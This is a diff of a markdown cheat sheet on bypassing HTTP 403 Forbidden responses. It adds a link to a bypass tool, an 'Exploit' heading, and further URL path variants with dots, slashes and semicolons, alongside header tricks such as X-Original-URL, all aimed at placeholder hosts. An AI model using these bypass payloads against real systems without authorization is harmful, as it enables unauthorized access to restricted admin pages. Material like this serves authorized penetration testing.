@@ -1,5 +1,11 @@
 # 403 Forbidden Bypass
 
+## Tools
+
+* [Bypass-403 | Go script for bypassing 403 forbidden](https://github.com/daffainfo/bypass-403)
+
+
+## Exploit
 1. Using "X-Original-URL" header
 ```
 GET /admin HTTP/1.1
@@ -21,15 +27,18 @@ Try this to bypass
 http://target.com/%2e/admin => 200
 ```
 
-3. Try add dot (.) and slash (/) in the URL
+3. Try add dot (.) slash (/) and semicolon (;) in the URL
 ```
 http://target.com/admin => 403
 ```
 Try this to bypass
 ```
-http://target.com/admin/. => 200
-http://target.com//admin// => 200
-http://target.com/./admin/./ => 200
+http://target.com/secret/. => 200
+http://target.com//secret// => 200
+http://target.com/./secret/.. => 200
+http://target.com/;/secret => 200
+http://target.com/.;/secret => 200
+http://target.com//;//secret => 200
 ```
 
 4. Add "..;/" after the directory name
@@ -58,4 +67,6 @@ Host: victim.com
 X­-Original-­URL: /admin
 ```
 
-Source: [@iam_j0ker](https://twitter.com/iam_j0ker)
+Source: 
+- [@iam_j0ker](https://twitter.com/iam_j0ker)
+- [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web)
